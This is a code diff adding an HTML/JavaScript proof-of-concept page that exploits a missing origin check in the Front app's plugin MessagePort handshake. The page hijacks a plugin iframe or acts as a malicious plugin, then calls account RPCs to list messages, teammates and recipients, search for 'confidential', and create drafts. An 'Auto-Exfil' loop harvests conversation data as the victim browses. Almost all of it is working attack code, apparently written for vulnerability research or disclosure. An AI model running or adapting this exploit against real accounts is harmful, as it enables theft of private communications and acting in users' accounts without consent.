@@ -1,0 +1,597 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Front MessagePort Hijack PoC</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, monospace; background: #0d1117; color: #c9d1d9; padding: 20px; }
+  h1 { color: #58a6ff; margin-bottom: 4px; font-size: 18px; }
+  h2 { color: #8b949e; font-size: 13px; font-weight: normal; margin-bottom: 16px; }
+  .panel { background: #161b22; border: 1px solid #30363d; border-radius: 6px; padding: 16px; margin-bottom: 12px; }
+  .panel-title { color: #58a6ff; font-size: 13px; font-weight: 600; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 0.5px; }
+  .status { display: inline-block; padding: 2px 8px; border-radius: 12px; font-size: 11px; font-weight: 600; }
+  .status-waiting { background: #1f1d2e; color: #8957e5; }
+  .status-connected { background: #0d2818; color: #3fb950; }
+  .status-error { background: #2d1115; color: #f85149; }
+  .status-exfil { background: #1c1d00; color: #d29922; }
+  button { background: #21262d; color: #c9d1d9; border: 1px solid #30363d; padding: 6px 14px; border-radius: 6px; cursor: pointer; font-size: 12px; margin: 2px; }
+  button:hover { background: #30363d; border-color: #58a6ff; }
+  button.primary { background: #238636; border-color: #2ea043; color: #fff; }
+  button.danger { background: #b62324; border-color: #da3633; color: #fff; }
+  #log { background: #0d1117; border: 1px solid #21262d; border-radius: 4px; padding: 10px; font-size: 11px; line-height: 1.6; max-height: 500px; overflow-y: auto; white-space: pre-wrap; word-break: break-all; margin-top: 8px; }
+  .log-handshake { color: #3fb950; }
+  .log-context { color: #58a6ff; }
+  .log-rpc { color: #d29922; }
+  .log-data { color: #f0883e; }
+  .log-error { color: #f85149; }
+  .log-info { color: #8b949e; }
+  .controls { display: flex; flex-wrap: wrap; gap: 4px; margin-top: 8px; }
+  .data-panel { background: #0d1117; border: 1px solid #21262d; border-radius: 4px; padding: 10px; margin-top: 8px; font-size: 11px; max-height: 300px; overflow-y: auto; }
+  .section { margin-bottom: 8px; }
+  .mode-tabs { display: flex; gap: 0; margin-bottom: 16px; }
+  .mode-tab { padding: 8px 16px; background: #161b22; border: 1px solid #30363d; cursor: pointer; font-size: 12px; color: #8b949e; }
+  .mode-tab:first-child { border-radius: 6px 0 0 6px; }
+  .mode-tab:last-child { border-radius: 0 6px 6px 0; }
+  .mode-tab.active { background: #21262d; color: #58a6ff; border-color: #58a6ff; }
+  .mode-content { display: none; }
+  .mode-content.active { display: block; }
+  table { width: 100%; border-collapse: collapse; font-size: 11px; margin-top: 6px; }
+  td, th { padding: 4px 8px; border: 1px solid #21262d; text-align: left; }
+  th { background: #161b22; color: #8b949e; }
+  .exfil-count { font-size: 24px; font-weight: bold; color: #d29922; }
+</style>
+</head>
+<body>
+
+<h1>Front ApplicationContextHost — MessagePort Hijack PoC</h1>
+<h2>Listener 9: Iframe→Parent handshake with no origin check, no replay guard</h2>
+
+<!-- Mode Selector -->
+<div class="mode-tabs">
+  <div class="mode-tab active" onclick="switchMode('plugin')">Mode A: Plugin (Direct)</div>
+  <div class="mode-tab" onclick="switchMode('hijack')">Mode B: External Hijack</div>
+</div>
+
+<!-- Mode A: Plugin (loaded as iframe inside Front) -->
+<div id="mode-plugin" class="mode-content active">
+  <div class="panel">
+    <div class="panel-title">Plugin Mode — Direct Handshake</div>
+    <p style="font-size:12px;color:#8b949e;margin-bottom:8px;">
+      This page is loaded as a Front plugin iframe. It sends the SDK handshake directly to the parent window.
+      Register this URL as a plugin endpoint in Front's developer settings.
+    </p>
+    <button class="primary" onclick="doPluginHandshake()">Send Handshake to Parent</button>
+    <span id="plugin-status" class="status status-waiting">WAITING</span>
+  </div>
+</div>
+
+<!-- Mode B: External Hijack (browsing context hijack) -->
+<div id="mode-hijack" class="mode-content">
+  <div class="panel">
+    <div class="panel-title">External Hijack Mode — Browsing Context Attack</div>
+    <p style="font-size:12px;color:#8b949e;margin-bottom:8px;">
+      Opens Front in a new window (no COOP header → valid cross-origin ref), then attempts to navigate
+      a plugin iframe to this page. Requires victim to have a plugin/app installed.
+    </p>
+    <div class="section">
+      <button class="primary" onclick="openFrontWindow()">1. Open Front Window</button>
+      <button onclick="enumerateFrames()">2. Enumerate Frames</button>
+      <button class="danger" onclick="hijackFrame()">3. Hijack Plugin Iframe</button>
+      <span id="hijack-status" class="status status-waiting">WAITING</span>
+    </div>
+    <div style="font-size:11px;color:#8b949e;margin-top:6px;">
+      <b>Target frame index:</b>
+      <input id="frame-idx" type="number" value="0" min="0" style="width:50px;background:#0d1117;color:#c9d1d9;border:1px solid #30363d;padding:2px 6px;border-radius:3px;">
+      <span id="frame-count" style="margin-left:8px;"></span>
+    </div>
+  </div>
+</div>
+
+<!-- Shared: Status & RPC Controls -->
+<div class="panel">
+  <div class="panel-title">Connection Status</div>
+  <div style="display:flex;gap:20px;align-items:center;">
+    <div>
+      <span style="color:#8b949e;font-size:11px;">Port:</span>
+      <span id="port-status" class="status status-waiting">NO PORT</span>
+    </div>
+    <div>
+      <span style="color:#8b949e;font-size:11px;">Contexts received:</span>
+      <span id="ctx-count" class="exfil-count">0</span>
+    </div>
+    <div>
+      <span style="color:#8b949e;font-size:11px;">RPC calls:</span>
+      <span id="rpc-count" class="exfil-count">0</span>
+    </div>
+  </div>
+</div>
+
+<div class="panel">
+  <div class="panel-title">RPC Controls — Execute After Handshake</div>
+  <p style="font-size:11px;color:#8b949e;margin-bottom:6px;">
+    These call real RPC methods on the victim's Front account via the hijacked MessagePort.
+    Requires a valid <code>contextId</code> (auto-captured from CONTEXT_UPDATE).
+  </p>
+  <div class="controls">
+    <button onclick="callRPC('listMessages')">listMessages</button>
+    <button onclick="callRPC('listRecipients')">listRecipients</button>
+    <button onclick="callRPC('listComments')">listComments</button>
+    <button onclick="callRPC('listTeammates')">listTeammates</button>
+    <button onclick="callRPC('listInboxes')">listInboxes</button>
+    <button onclick="callRPC('listChannels')">listChannels</button>
+    <button onclick="callRPC('listTags')">listTags</button>
+    <button onclick="callRPC('fetchPath')">fetchPath</button>
+    <button onclick="callRPC('search', ['confidential'])">search("confidential")</button>
+    <button class="danger" onclick="callRPC('createDraft', [{content:{body:'PoC draft',type:'text'}, replyOptions:{type:'reply',originalMessageId:lastMessageId}}])">createDraft (reply)</button>
+  </div>
+  <div class="controls" style="margin-top:4px;">
+    <button onclick="sendCustomRPC()">Custom RPC...</button>
+    <button class="danger" onclick="startAutoExfil()">Auto-Exfil (passive)</button>
+    <button onclick="stopAutoExfil()">Stop Auto-Exfil</button>
+  </div>
+</div>
+
+<!-- Captured Data -->
+<div class="panel">
+  <div class="panel-title">Captured Contexts & Data</div>
+  <div id="captured-data" class="data-panel">
+    <span class="log-info">Waiting for CONTEXT_UPDATE messages...</span>
+  </div>
+</div>
+
+<!-- Event Log -->
+<div class="panel">
+  <div class="panel-title">Event Log</div>
+  <div id="log"></div>
+</div>
+
+<script>
+// ========================================
+// CONSTANTS
+// ========================================
+const HANDSHAKE_MSG = '@frontapp/ui-sdk#WebViewBridge.handshake';
+const MSG_TYPES = {
+  CONTEXT_UPDATE: 'context_update',
+  FUNCTION_CALL: 'function_call',
+  FUNCTION_CANCEL: 'function_cancel',
+  FUNCTION_RESULT: 'function_result',
+  FUNCTION_ERROR: 'function_error',
+};
+
+// ========================================
+// STATE
+// ========================================
+let myPort = null;           // Our end of the MessageChannel
+let frontWindow = null;      // Reference to Front's window (hijack mode)
+let latestContextId = null;  // Most recent contextId from CONTEXT_UPDATE
+let latestContext = null;    // Full context object
+let lastMessageId = null;    // For createDraft reply
+let contextCount = 0;
+let rpcCount = 0;
+let rpcCallbacks = {};       // id -> callback
+let autoExfilInterval = null;
+let allCapturedData = [];     // All captured contexts and RPC results
+
+// ========================================
+// LOGGING
+// ========================================
+const logEl = document.getElementById('log');
+function log(msg, cls = 'log-info') {
+  const ts = new Date().toISOString().split('T')[1].replace('Z','');
+  logEl.innerHTML += `<span class="${cls}">[${ts}] ${escapeHtml(msg)}</span>\n`;
+  logEl.scrollTop = logEl.scrollHeight;
+}
+
+function escapeHtml(str) {
+  return String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+// ========================================
+// MODE SWITCHING
+// ========================================
+function switchMode(mode) {
+  document.querySelectorAll('.mode-tab').forEach(t => t.classList.remove('active'));
+  document.querySelectorAll('.mode-content').forEach(c => c.classList.remove('active'));
+  document.getElementById('mode-' + mode).classList.add('active');
+  document.querySelector(`.mode-tab[onclick*="${mode}"]`).classList.add('active');
+}
+
+// ========================================
+// AUTO-DETECT: If loaded inside an iframe, auto-handshake
+// ========================================
+if (window.self !== window.top) {
+  log('Detected: running inside an iframe. Auto-initiating plugin handshake...', 'log-handshake');
+  switchMode('plugin');
+  setTimeout(doPluginHandshake, 500);
+}
+
+// ========================================
+// MODE A: PLUGIN HANDSHAKE (Direct)
+// ========================================
+function doPluginHandshake() {
+  log('Creating MessageChannel...', 'log-handshake');
+  const channel = new MessageChannel();
+  myPort = channel.port1;
+
+  // Setup port listener BEFORE sending handshake
+  setupPortListener(myPort);
+
+  // Send handshake to parent with port2
+  log(`Sending handshake: "${HANDSHAKE_MSG}" to parent via postMessage(msg, "*", [port2])`, 'log-handshake');
+  window.parent.postMessage(HANDSHAKE_MSG, '*', [channel.port2]);
+
+  document.getElementById('plugin-status').textContent = 'HANDSHAKE SENT';
+  document.getElementById('plugin-status').className = 'status status-exfil';
+  log('Handshake sent. Waiting for CONTEXT_UPDATE on port...', 'log-handshake');
+}
+
+// ========================================
+// MODE B: EXTERNAL HIJACK
+// ========================================
+function openFrontWindow() {
+  log('Opening Front in new window (no COOP → valid cross-origin ref)...', 'log-handshake');
+  frontWindow = window.open('https://app.frontapp.com/', '_blank');
+
+  if (!frontWindow) {
+    log('ERROR: Popup blocked! Allow popups for this site.', 'log-error');
+    document.getElementById('hijack-status').textContent = 'POPUP BLOCKED';
+    document.getElementById('hijack-status').className = 'status status-error';
+    return;
+  }
+
+  log('Front window opened. WindowProxy reference obtained.', 'log-handshake');
+  log('Wait for Front to load and a plugin iframe to render, then enumerate frames.', 'log-info');
+  document.getElementById('hijack-status').textContent = 'WINDOW OPENED';
+  document.getElementById('hijack-status').className = 'status status-exfil';
+}
+
+function enumerateFrames() {
+  if (!frontWindow) {
+    log('ERROR: No Front window reference. Open it first.', 'log-error');
+    return;
+  }
+
+  try {
+    const count = frontWindow.frames.length;
+    document.getElementById('frame-count').textContent = `${count} frames found`;
+    log(`Enumerated ${count} frames in Front window.`, 'log-info');
+
+    // Try to get more info about each frame
+    for (let i = 0; i < count; i++) {
+      try {
+        // Cross-origin: we can't read properties, but we can check if the ref exists
+        const frameRef = frontWindow.frames[i];
+        log(`  Frame[${i}]: WindowProxy ref obtained (cross-origin, properties not readable)`, 'log-info');
+      } catch(e) {
+        log(`  Frame[${i}]: ${e.message}`, 'log-error');
+      }
+    }
+  } catch(e) {
+    log(`Error enumerating frames: ${e.message}`, 'log-error');
+  }
+}
+
+function hijackFrame() {
+  if (!frontWindow) {
+    log('ERROR: No Front window reference.', 'log-error');
+    return;
+  }
+
+  const idx = parseInt(document.getElementById('frame-idx').value, 10);
+  const hijackUrl = window.location.href;
+
+  log(`Attempting to navigate Frame[${idx}] to: ${hijackUrl}`, 'log-handshake');
+  log('This navigates the plugin iframe to our page. The WindowProxy remains the same.', 'log-info');
+  log('After navigation, our page runs inside the iframe and can send the handshake.', 'log-info');
+
+  try {
+    frontWindow.frames[idx].location = hijackUrl;
+    log('Frame navigation initiated! If successful, this page will reload inside the iframe.', 'log-handshake');
+    document.getElementById('hijack-status').textContent = 'HIJACK SENT';
+    document.getElementById('hijack-status').className = 'status status-connected';
+  } catch(e) {
+    log(`Frame navigation BLOCKED: ${e.message}`, 'log-error');
+    log('Browser blocked cross-origin descendant frame navigation.', 'log-error');
+    log('Alternative: Use this page as a plugin URL directly (Mode A).', 'log-info');
+    document.getElementById('hijack-status').textContent = 'BLOCKED';
+    document.getElementById('hijack-status').className = 'status status-error';
+  }
+}
+
+// ========================================
+// PORT LISTENER — Handles all messages from Front
+// ========================================
+function setupPortListener(port) {
+  port.addEventListener('message', (event) => {
+    const msg = event.data;
+
+    if (!msg || !msg.type) {
+      log('Received unknown message: ' + JSON.stringify(msg), 'log-info');
+      return;
+    }
+
+    switch (msg.type) {
+      case MSG_TYPES.CONTEXT_UPDATE:
+        handleContextUpdate(msg);
+        break;
+
+      case MSG_TYPES.FUNCTION_RESULT:
+        handleFunctionResult(msg);
+        break;
+
+      case MSG_TYPES.FUNCTION_ERROR:
+        handleFunctionError(msg);
+        break;
+
+      default:
+        log(`Unknown message type: ${msg.type} — ${JSON.stringify(msg).slice(0, 200)}`, 'log-info');
+    }
+  });
+
+  port.start();
+  log('Port listener active. Waiting for messages...', 'log-handshake');
+  document.getElementById('port-status').textContent = 'LISTENING';
+  document.getElementById('port-status').className = 'status status-connected';
+}
+
+// ========================================
+// CONTEXT UPDATE HANDLER
+// ========================================
+function handleContextUpdate(msg) {
+  contextCount++;
+  document.getElementById('ctx-count').textContent = contextCount;
+
+  const ctx = msg.context;
+  latestContextId = ctx.id;
+  latestContext = ctx;
+
+  log(`CONTEXT_UPDATE received! Type: ${ctx.type}, ID: ${ctx.id}`, 'log-context');
+
+  // Extract key data
+  const summary = {
+    type: ctx.type,
+    id: ctx.id,
+    availableFunctions: ctx.functionArities ? Object.keys(ctx.functionArities) : [],
+  };
+
+  if (ctx.type === 'singleConversation' && ctx.conversation) {
+    const conv = ctx.conversation;
+    summary.conversation = {
+      id: conv.id,
+      subject: conv.subject,
+      status: conv.status,
+      assignee: conv.assignee,
+      recipient: conv.recipient,
+      tags: conv.tags,
+      inboxIds: conv.inboxIds,
+    };
+    log(`  Conversation: "${conv.subject}" (${conv.id})`, 'log-data');
+    log(`  Status: ${conv.status}, Assignee: ${JSON.stringify(conv.assignee)}`, 'log-data');
+    log(`  Recipient: ${JSON.stringify(conv.recipient)}`, 'log-data');
+  }
+
+  if (ctx.type === 'messageComposer' && ctx.draft) {
+    summary.draft = ctx.draft;
+    log(`  Draft ID: ${ctx.draft.id}`, 'log-data');
+  }
+
+  if (ctx.teammate) {
+    summary.teammate = ctx.teammate;
+    log(`  Teammate: ${ctx.teammate.name} (${ctx.teammate.email})`, 'log-data');
+  }
+
+  if (ctx.company) {
+    summary.company = ctx.company;
+    log(`  Company: ${ctx.company.name}`, 'log-data');
+  }
+
+  log(`  Available RPC methods: ${summary.availableFunctions.join(', ')}`, 'log-context');
+
+  // Store captured data
+  allCapturedData.push({timestamp: new Date().toISOString(), type: 'context', data: summary});
+  updateCapturedDataPanel();
+}
+
+// ========================================
+// RPC CALL HANDLER
+// ========================================
+function callRPC(functionName, args = []) {
+  if (!myPort) {
+    log('ERROR: No port available. Complete handshake first.', 'log-error');
+    return;
+  }
+
+  if (!latestContextId) {
+    log('ERROR: No contextId available. Wait for a CONTEXT_UPDATE.', 'log-error');
+    return;
+  }
+
+  rpcCount++;
+  document.getElementById('rpc-count').textContent = rpcCount;
+
+  const callId = 'poc-' + Date.now() + '-' + Math.random().toString(36).slice(2, 8);
+
+  // Build the function call arguments
+  // All functions end with a cancelToken (undefined)
+  let callArgs;
+  if (args.length === 0) {
+    // Functions like listMessages([paginationToken, cancelToken])
+    // or fetchPath([cancelToken])
+    const arity = latestContext?.functionArities?.[functionName];
+    if (arity && arity > 1) {
+      callArgs = new Array(arity).fill(undefined);
+    } else {
+      callArgs = [undefined]; // Just cancelToken
+    }
+  } else {
+    callArgs = [...args, undefined]; // args + cancelToken
+  }
+
+  const message = {
+    type: MSG_TYPES.FUNCTION_CALL,
+    id: callId,
+    contextId: latestContextId,
+    call: {
+      [functionName]: callArgs
+    }
+  };
+
+  // Register callback
+  rpcCallbacks[callId] = {functionName, timestamp: Date.now()};
+
+  log(`RPC CALL: ${functionName}(${JSON.stringify(callArgs).slice(0,100)}) — id: ${callId}`, 'log-rpc');
+  myPort.postMessage(message);
+}
+
+function handleFunctionResult(msg) {
+  const cb = rpcCallbacks[msg.id];
+  const funcName = cb ? cb.functionName : 'unknown';
+  delete rpcCallbacks[msg.id];
+
+  log(`RPC RESULT [${funcName}]: ${JSON.stringify(msg.value).slice(0, 500)}`, 'log-data');
+
+  // Store for display
+  allCapturedData.push({
+    timestamp: new Date().toISOString(),
+    type: 'rpc_result',
+    function: funcName,
+    data: msg.value
+  });
+
+  // Extract message IDs for createDraft
+  if (funcName === 'listMessages' && msg.value && msg.value.results) {
+    const messages = msg.value.results;
+    if (messages.length > 0) {
+      lastMessageId = messages[0].id;
+      log(`  Captured ${messages.length} messages. First message ID: ${lastMessageId}`, 'log-data');
+      messages.forEach((m, i) => {
+        log(`  [${i}] From: ${m.from?.name || m.from?.handle || 'unknown'} | Subject: ${m.subject || '(none)'} | Body preview: ${(m.body || '').slice(0, 100)}`, 'log-data');
+      });
+    }
+  }
+
+  if (funcName === 'listTeammates' && msg.value && msg.value.results) {
+    msg.value.results.forEach((t, i) => {
+      log(`  Teammate[${i}]: ${t.name} <${t.email}> (${t.id})`, 'log-data');
+    });
+  }
+
+  if (funcName === 'listRecipients' && msg.value && msg.value.results) {
+    msg.value.results.forEach((r, i) => {
+      log(`  Recipient[${i}]: ${r.name || 'unknown'} <${r.handle}> role=${r.role}`, 'log-data');
+    });
+  }
+
+  updateCapturedDataPanel();
+}
+
+function handleFunctionError(msg) {
+  const cb = rpcCallbacks[msg.id];
+  const funcName = cb ? cb.functionName : 'unknown';
+  delete rpcCallbacks[msg.id];
+
+  log(`RPC ERROR [${funcName}]: ${msg.error}`, 'log-error');
+}
+
+// ========================================
+// AUTO-EXFIL: Passively captures data as victim navigates conversations
+// ========================================
+function startAutoExfil() {
+  if (autoExfilInterval) {
+    log('Auto-exfil already running.', 'log-info');
+    return;
+  }
+
+  log('AUTO-EXFIL STARTED: Will call listMessages + listRecipients on every new context.', 'log-rpc');
+
+  // Track the last contextId we exfiltrated
+  let lastExfilContextId = null;
+
+  autoExfilInterval = setInterval(() => {
+    if (latestContextId && latestContextId !== lastExfilContextId && myPort) {
+      lastExfilContextId = latestContextId;
+      log(`Auto-exfil: New context ${latestContextId} — fetching messages & recipients...`, 'log-rpc');
+      callRPC('listMessages');
+      setTimeout(() => callRPC('listRecipients'), 200);
+      setTimeout(() => callRPC('listComments'), 400);
+    }
+  }, 1000);
+}
+
+function stopAutoExfil() {
+  if (autoExfilInterval) {
+    clearInterval(autoExfilInterval);
+    autoExfilInterval = null;
+    log('Auto-exfil stopped.', 'log-info');
+  }
+}
+
+// ========================================
+// CUSTOM RPC
+// ========================================
+function sendCustomRPC() {
+  const funcName = prompt('Function name (e.g., listMessages, relayHttp, openUrl):');
+  if (!funcName) return;
+
+  const argsStr = prompt('Arguments as JSON array (e.g., [] or ["query string"]):', '[]');
+  if (argsStr === null) return;
+
+  try {
+    const args = JSON.parse(argsStr);
+    callRPC(funcName, args);
+  } catch(e) {
+    log(`Invalid JSON args: ${e.message}`, 'log-error');
+  }
+}
+
+// ========================================
+// CAPTURED DATA PANEL
+// ========================================
+function updateCapturedDataPanel() {
+  const el = document.getElementById('captured-data');
+  let html = '';
+
+  for (const item of allCapturedData.slice(-20)) {
+    if (item.type === 'context') {
+      html += `<div style="margin-bottom:8px;border-bottom:1px solid #21262d;padding-bottom:6px;">`;
+      html += `<span class="log-context">[CONTEXT] ${escapeHtml(item.timestamp)}</span>\n`;
+      html += `  Type: ${escapeHtml(item.data.type)} | ID: ${escapeHtml(item.data.id)}\n`;
+      if (item.data.conversation) {
+        html += `  Subject: "${escapeHtml(item.data.conversation.subject || '')}"\n`;
+        html += `  Recipient: ${escapeHtml(JSON.stringify(item.data.conversation.recipient))}\n`;
+      }
+      if (item.data.teammate) {
+        html += `  Teammate: ${escapeHtml(item.data.teammate.name)} &lt;${escapeHtml(item.data.teammate.email)}&gt;\n`;
+      }
+      html += `  Functions: ${escapeHtml(item.data.availableFunctions.join(', '))}\n`;
+      html += `</div>`;
+    } else if (item.type === 'rpc_result') {
+      html += `<div style="margin-bottom:8px;border-bottom:1px solid #21262d;padding-bottom:6px;">`;
+      html += `<span class="log-rpc">[RPC:${escapeHtml(item.function)}] ${escapeHtml(item.timestamp)}</span>\n`;
+      html += `  ${escapeHtml(JSON.stringify(item.data, null, 2).slice(0, 1000))}\n`;
+      html += `</div>`;
+    }
+  }
+
+  el.innerHTML = html || '<span class="log-info">Waiting for CONTEXT_UPDATE messages...</span>';
+}
+
+// ========================================
+// INIT LOG
+// ========================================
+log('=== Front MessagePort Hijack PoC ===', 'log-handshake');
+log(`Handshake string: "${HANDSHAKE_MSG}"`, 'log-info');
+log('', 'log-info');
+log('Vulnerability: applicationContextHost.tsx', 'log-info');
+log('  - Handshake direction: Iframe → Parent (iframe initiates)', 'log-info');
+log('  - Origin check: NONE', 'log-error');
+log('  - Replay guard: NONE (setIframePort overwrites unconditionally)', 'log-error');
+log('  - Source check: event.source === contentWindow (bypassed via browsing context hijack)', 'log-info');
+log('  - COOP header: NOT SET (window.open returns valid ref)', 'log-info');
+log('', 'log-info');
+log('Select a mode above and follow the steps.', 'log-info');
+</script>
+</body>
+</html>
